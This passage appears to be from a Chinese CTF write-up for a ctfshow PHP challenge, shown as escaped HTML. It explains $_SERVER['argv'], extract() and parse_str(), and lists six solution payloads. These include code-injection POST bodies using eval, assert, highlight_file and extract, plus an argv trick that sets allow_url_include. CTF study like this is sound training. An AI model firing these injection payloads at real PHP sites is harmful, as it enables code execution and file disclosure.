&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;Array
(
   [0] =&amp;gt; test.php
   [1] =&amp;gt; a
   [2] =&amp;gt; b
   [3] =&amp;gt; c
)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;argv[0]&lt;/code&gt; 是脚本名&lt;/li&gt;
&lt;li&gt;后面是你执行命令时传的参数&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;Web 环境下的 &lt;code&gt;argv&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;在 &lt;strong&gt;正常的 Apache&amp;#x2F;Nginx + PHP-FPM&lt;/strong&gt; Web 环境里，&lt;code&gt;$_SERVER[&amp;#39;argv&amp;#39;]&lt;/code&gt; 默认是空的，因为浏览器不会传 CLI 参数给 PHP。&lt;/li&gt;
&lt;li&gt;但有些特殊的运行模式（比如 CGI&amp;#x2F;FastCGI 或 &lt;code&gt;php-cgi&lt;/code&gt; 启动时）**可以通过 URL 或 POST 来伪造 &lt;code&gt;argv&lt;/code&gt;**，原理是 PHP 在 CGI 模式下会把请求数据解析成 &lt;code&gt;argv&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举个例子：&lt;br&gt;假设服务端代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$a = $_SERVER[&amp;#39;argv&amp;#39;];
var_dump($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;http://example.com/index.php?-d+allow_url_include=On
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可能会看到：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;array(2) &amp;#123;
[0] =&amp;gt;
string(9) &amp;quot;index.php&amp;quot;
[1] =&amp;gt;
string(26) &amp;quot;-d allow_url_include=On&amp;quot;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样我们就&lt;strong&gt;传递了命令行参数&lt;/strong&gt;给 PHP，即使是在 Web 环境。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$_SERVER[&amp;#39;argv&amp;#39;]：

1、cli模式（命令行）下

第一个参数$_SERVER[&amp;#39;argv&amp;#39;][0]是脚本名，其余的是传递给脚本的参数

2、web网页模式下

在web页模式下必须在php.ini开启register_argc_argv配置项

  设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果

  这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]

  $argv,$argc在web模式下不适用
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在网页模式下的，注意重点：&lt;br&gt;&lt;code&gt;$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]&lt;/code&gt;&lt;br&gt;而 &lt;code&gt;$_SERVER[‘QUERY_STRING’] &lt;/code&gt; 是获取查询语句，即 &lt;code&gt;?&lt;/code&gt; 后面的语句&lt;/p&gt;
&lt;p&gt;举个例子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?$fl0g=flag_give_me
$a[0]=$_SERVER[&amp;#39;argv&amp;#39;][0]=$_SERVER[‘QUERY_STRING’]=&amp;gt;$fl0g=flag_give_me
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;CTF_SHOW=1&amp;amp;CTF[SHOW.COM=1&amp;amp;fun=echo $flag
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250812095028935.png&#34; alt=&#34;image-20250812095028935&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#POST
CTF_SHOW=1&amp;amp;CTF[SHOW.COM=1&amp;amp;fun=highlight_file($_GET[a])

#GET
?a=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;CTF_SHOW=1&amp;amp;CTF[SHOW.COM=1&amp;amp;fun=var_export(get_defined_vars())
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250812145204578.png&#34; alt=&#34;image-20250812145204578&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解四&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;extract()&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 定义&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;extract()&lt;/code&gt; 会将&lt;strong&gt;数组的键名&lt;/strong&gt;当作&lt;strong&gt;变量名&lt;/strong&gt;，并将数组的值赋给这个变量。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;extract(array &amp;amp;$array, int $flags = EXTR_OVERWRITE, string $prefix = &amp;quot;&amp;quot;): int
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;**&lt;code&gt;$array&lt;/code&gt;**：要导入变量的关联数组（键名必须是字符串才能变成变量名）。&lt;/li&gt;
&lt;li&gt;**&lt;code&gt;$flags&lt;/code&gt;**：可选，控制冲突时的行为（变量名已存在怎么办）。&lt;/li&gt;
&lt;li&gt;**&lt;code&gt;$prefix&lt;/code&gt;**：可选，给所有变量名加前缀（防止冲突）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;返回值是成功导入的变量个数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 基本用法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$arr = [
  &amp;#39;color&amp;#39; =&amp;gt; &amp;#39;blue&amp;#39;,
  &amp;#39;size&amp;#39;  =&amp;gt; &amp;#39;large&amp;#39;
];

extract($arr);

echo $color; // blue
echo $size;  // large
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;extract()&lt;/code&gt; 会直接把 &lt;code&gt;$arr[&amp;#39;color&amp;#39;]&lt;/code&gt; 变成 &lt;code&gt;$color&lt;/code&gt; 变量，把 &lt;code&gt;$arr[&amp;#39;size&amp;#39;]&lt;/code&gt; 变成 &lt;code&gt;$size&lt;/code&gt; 变量。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. &lt;code&gt;$flags&lt;/code&gt; 冲突处理模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;官方文档定义了多个模式（默认是 &lt;code&gt;EXTR_OVERWRITE&lt;/code&gt;）：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;常量&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXTR_OVERWRITE&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;默认值&lt;/strong&gt;，同名变量会被覆盖。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXTR_SKIP&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;如果变量名冲突，则跳过（保留原变量）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXTR_PREFIX_SAME&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;同名变量加前缀（需要 &lt;code&gt;$prefix&lt;/code&gt; 参数）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXTR_PREFIX_ALL&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;所有变量名都加前缀。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXTR_PREFIX_INVALID&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;只有非法变量名加前缀（数字开头等）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXTR_IF_EXISTS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;只覆盖已存在的变量，不创建新变量。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXTR_PREFIX_IF_EXISTS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;只给已存在的变量加前缀。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXTR_REFS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;导入的是变量引用（修改新变量会影响原数组）。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;CTF_SHOW=1&amp;amp;CTF[SHOW.COM=1&amp;amp;fl0g=flag_give_me&amp;amp;fun=extract($_POST)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（执行 &lt;code&gt;extract($_POST)&lt;/code&gt; 后创建变量 &lt;code&gt;$fl0g = &amp;#39;flag_give_me&amp;#39;&lt;/code&gt;）&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250812110617309.png&#34; alt=&#34;image-20250812110617309&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解五&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?$fl0g=flag_give_me;

#POST
CTF[SHOW.COM=1&amp;amp;CTF_SHOW=1&amp;amp;fun=eval($a[0])

CTF[SHOW.COM=1&amp;amp;CTF_SHOW=1&amp;amp;fun=assert($a[0])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;在 &lt;code&gt;eval(&amp;quot;$c;&amp;quot;);&lt;/code&gt; 中实际执行的是 &lt;code&gt;eval(&amp;#39;eval($a[0]);&amp;#39;);&lt;/code&gt;，因为 &lt;code&gt;$a[0]&lt;/code&gt; 是 &lt;code&gt;&amp;#39;$fl0g=flag_give_me;&amp;#39;&lt;/code&gt;，这相当于执行了 &lt;code&gt;eval(&amp;#39;$fl0g=flag_give_me;&amp;#39;);&lt;/code&gt;，这样就定义了变量 &lt;code&gt;$fl0g&lt;/code&gt; 并赋值为 &lt;code&gt;&amp;#39;flag_give_me&amp;#39;&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解六&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;parse_str()&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;基本作用&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;parse_str()&lt;/code&gt; 有两种用法：&lt;/p&gt;
&lt;p&gt;① 只传一个参数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$str = &amp;quot;foo=bar&amp;amp;baz=qux&amp;quot;;
parse_str($str);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;效果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP 会把 &lt;code&gt;$str&lt;/code&gt; 当成 URL 查询字符串解析&lt;/li&gt;
&lt;li&gt;直接在当前作用域创建变量：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$foo = &amp;quot;bar&amp;quot;;
$baz = &amp;quot;qux&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：如果字符串里有 &lt;code&gt;$fl0g=xxx&lt;/code&gt;，就会创建 &lt;code&gt;$fl0g&lt;/code&gt; 变量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;② 传两个参数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$str = &amp;quot;foo=bar&amp;amp;baz=qux&amp;quot;;
parse_str($str, $output);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;效果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不污染当前作用域&lt;/li&gt;
&lt;li&gt;解析结果存在 &lt;code&gt;$output&lt;/code&gt; 数组里：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$output = [
  &amp;quot;foo&amp;quot; =&amp;gt; &amp;quot;bar&amp;quot;,
  &amp;quot;baz&amp;quot; =&amp;gt; &amp;quot;qux&amp;quot;
];
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;+&lt;/code&gt; 隔断 &lt;code&gt;argv&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
